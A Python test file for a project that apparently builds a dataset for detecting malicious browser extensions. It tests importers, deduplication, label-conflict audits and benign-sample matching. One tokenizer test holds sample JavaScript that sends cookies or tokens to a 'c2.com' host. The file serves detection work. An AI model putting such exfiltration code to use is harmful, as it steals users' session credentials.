"""Unit and integration tests for Phase 2: Dataset, provenance, dedup, and audit."""

from pathlib import Path

from backend.app.core.config import settings
from backend.app.database.connection import get_db_connection, init_db
from backend.app.database.models import SampleRecord
from ml.collection.audit import (
    dataset_quality_summary,
    detect_label_conflicts,
    generate_missing_file_report,
)
from ml.collection.benign_matcher import match_benign_samples_to_malicious
from ml.collection.dedup import jaccard_similarity, run_deduplication_and_clustering, tokenize_code
from ml.collection.importers import (
    import_chrome_mal_ids,
    import_local_package,
    import_sentry_ioc_records,
    insert_sample_record,
)


def create_test_db(tmp_path: Path, monkeypatch) -> Path:
    test_db = tmp_path / "test_sentinel.db"
    monkeypatch.setattr(settings, "DB_PATH", test_db)
    init_db(test_db)
    return test_db


def test_schema_creation(tmp_path: Path, monkeypatch):
    test_db = create_test_db(tmp_path, monkeypatch)
    assert test_db.is_file()

    with get_db_connection(test_db) as conn:
        cursor = conn.cursor()
        cursor.execute("SELECT name FROM sqlite_master WHERE type='table'")
        tables = {row["name"] for row in cursor.fetchall()}
        assert "samples" in tables
        assert "scan_history" in tables


def test_insert_sample_and_provenance(tmp_path: Path, monkeypatch):
    create_test_db(tmp_path, monkeypatch)
    sample = SampleRecord(
        extension_id="abcdefghijklmnopabcdefghijklmnop",
        version="1.0.2",
        manifest_version=3,
        sha256="e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
        source="unit_test",
        source_record_id="rec_001",
        label="malicious",
        label_evidence="Observed exfiltrating cookies to external C2",
        label_confidence=0.98,
        threat_family="cookie_stealer",
        parse_status="parsed",
        category="shopping",
        size_bytes=10240,
    )

    with get_db_connection() as conn:
        inserted = insert_sample_record(conn, sample)
        assert inserted is True

        cursor = conn.cursor()
        cursor.execute("SELECT * FROM samples WHERE extension_id = ?", (sample.extension_id,))
        row = cursor.fetchone()
        assert row is not None
        assert row["label"] == "malicious"
        assert row["threat_family"] == "cookie_stealer"
        assert row["label_confidence"] == 0.98
        assert row["category"] == "shopping"


def test_chrome_mal_ids_importer(tmp_path: Path, monkeypatch):
    create_test_db(tmp_path, monkeypatch)
    csv_mock = (
        "EXTID,EXTID-NAME,SOURCE,THREAT-TYPE\n"
        "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa,Fake Wallet,Security Report A,crypto-drainer\n"
        "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb,Ad Injector,Security Report B,adware\n"
    )

    inserted, total = import_chrome_mal_ids(csv_mock)
    assert inserted == 2
    assert total == 2

    with get_db_connection() as conn:
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM samples WHERE source = 'chrome-mal-ids'")
        rows = cursor.fetchall()
        assert len(rows) == 2
        assert all(r["parse_status"] == "id_only" for r in rows)
        assert all(r["label"] == "malicious" for r in rows)


def test_sentry_ioc_importer(tmp_path: Path, monkeypatch):
    create_test_db(tmp_path, monkeypatch)
    json_mock = (
        '{"extensions": ['
        '{"id": "cccccccccccccccccccccccccccccccc", "reason": "DDoS client", "family": "botnet"},'
        '"dddddddddddddddddddddddddddddddd"'
        ']}'
    )

    inserted, total = import_sentry_ioc_records(json_mock)
    assert inserted == 2
    assert total == 2

    with get_db_connection() as conn:
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM samples WHERE source = 'malicious_extension_sentry'")
        rows = cursor.fetchall()
        assert len(rows) == 2
        assert any(r["threat_family"] == "botnet" for r in rows)


def test_import_local_package(tmp_path: Path, monkeypatch):
    create_test_db(tmp_path, monkeypatch)
    import zipfile

    pkg_file = tmp_path / "eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee.zip"
    with zipfile.ZipFile(pkg_file, "w") as zf:
        zf.writestr("manifest.json", '{"manifest_version": 3, "name": "Local Ext", "version": "1.0"}')
        zf.writestr("bg.js", "console.log('clean');")

    sample = import_local_package(pkg_file, label="benign", source="manual_archive")
    assert sample is not None
    assert sample.parse_status == "parsed"
    assert sample.label == "benign"
    assert sample.normalized_source_hash is not None
    assert sample.benign_verification_date is not None


def test_exact_and_near_duplicate_clustering(tmp_path: Path, monkeypatch):
    create_test_db(tmp_path, monkeypatch)

    with get_db_connection() as conn:
        # Same extension ID, two different versions -> must be same cluster
        s1 = SampleRecord(
            extension_id="sameid11111111111111111111111111",
            version="1.0",
            source="src1",
            label="benign",
            normalized_source_hash="hash_a",
        )
        s2 = SampleRecord(
            extension_id="sameid11111111111111111111111111",
            version="2.0",
            source="src2",
            label="benign",
            normalized_source_hash="hash_b",
        )
        # Different extension ID, but identical normalized source code -> near-duplicate variant
        s3 = SampleRecord(
            extension_id="variant22222222222222222222222222",
            version="1.0",
            source="src3",
            label="benign",
            normalized_source_hash="hash_b",
        )
        # Completely independent sample
        s4 = SampleRecord(
            extension_id="unrelated3333333333333333333333333",
            version="1.0",
            source="src4",
            label="malicious",
            normalized_source_hash="hash_independent",
        )
        insert_sample_record(conn, s1)
        insert_sample_record(conn, s2)
        insert_sample_record(conn, s3)
        insert_sample_record(conn, s4)

    res = run_deduplication_and_clustering()
    assert res["total_samples"] == 4
    assert res["clusters"] == 2  # {s1, s2, s3} clustered together, {s4} separate

    with get_db_connection() as conn:
        cursor = conn.cursor()
        cursor.execute("SELECT extension_id, near_dup_cluster_id FROM samples")
        rows = {r["extension_id"]: r["near_dup_cluster_id"] for r in cursor.fetchall()}

        assert rows["sameid11111111111111111111111111"] == rows["variant22222222222222222222222222"]
        assert rows["sameid11111111111111111111111111"] != rows["unrelated3333333333333333333333333"]


def test_label_conflict_detection(tmp_path: Path, monkeypatch):
    create_test_db(tmp_path, monkeypatch)

    with get_db_connection() as conn:
        # Same extension ID with conflicting labels across sources
        s1 = SampleRecord(
            extension_id="conflicted11111111111111111111111",
            version="1.0",
            source="source_benign",
            label="benign",
        )
        s2 = SampleRecord(
            extension_id="conflicted11111111111111111111111",
            version="1.1",
            source="source_malicious",
            label="malicious",
        )
        insert_sample_record(conn, s1)
        insert_sample_record(conn, s2)

    conflicts = detect_label_conflicts()
    assert len(conflicts) == 1
    assert conflicts[0]["identifier"] == "conflicted11111111111111111111111"
    assert "benign" in conflicts[0]["distinct_labels"]
    assert "malicious" in conflicts[0]["distinct_labels"]


def test_dataset_quality_summary_and_missing_report(tmp_path: Path, monkeypatch):
    create_test_db(tmp_path, monkeypatch)

    with get_db_connection() as conn:
        s1 = SampleRecord(
            extension_id="ext111111111111111111111111111111",
            label="malicious",
            source="chrome-mal-ids",
            parse_status="id_only",
        )
        insert_sample_record(conn, s1)

    missing = generate_missing_file_report()
    assert missing["threat_intel_id_only"] == 1
    assert missing["packages_present_on_disk"] == 0

    summary = dataset_quality_summary()
    assert summary["total_samples"] == 1
    assert summary["label_distribution"]["malicious"] == 1
    assert "NOTICE: Real malicious packages are limited" in summary["uncertainty_notice"]


def test_tokenization_and_jaccard():
    code1 = "function doExfiltrate(cookie, token) { fetch('https://c2.com', {body: token}); }"
    code2 = "function doExfiltrate(cookie, token) { fetch('https://c2.com', {body: cookie}); }"
    t1 = tokenize_code(code1)
    t2 = tokenize_code(code2)
    sim = jaccard_similarity(t1, t2)
    assert sim > 0.80


def test_benign_matching_policy(tmp_path: Path, monkeypatch):
    create_test_db(tmp_path, monkeypatch)

    # Insert malicious reference
    with get_db_connection() as conn:
        mal = SampleRecord(
            extension_id="mal111111111111111111111111111111",
            label="malicious",
            source="research",
            parse_status="parsed",
            category="shopping",
            size_bytes=50000,  # small
            manifest_version=3,
        )
        insert_sample_record(conn, mal)

    candidates = [
        {"name": "B1", "category": "productivity", "size_bytes": 5000000, "manifest_version": 2},
        {"name": "B2", "category": "shopping", "size_bytes": 60000, "manifest_version": 3},  # best match
    ]

    matched = match_benign_samples_to_malicious(candidates)
    assert len(matched) == 1
    assert matched[0]["name"] == "B2"
    assert "benign_verification_date" in matched[0]
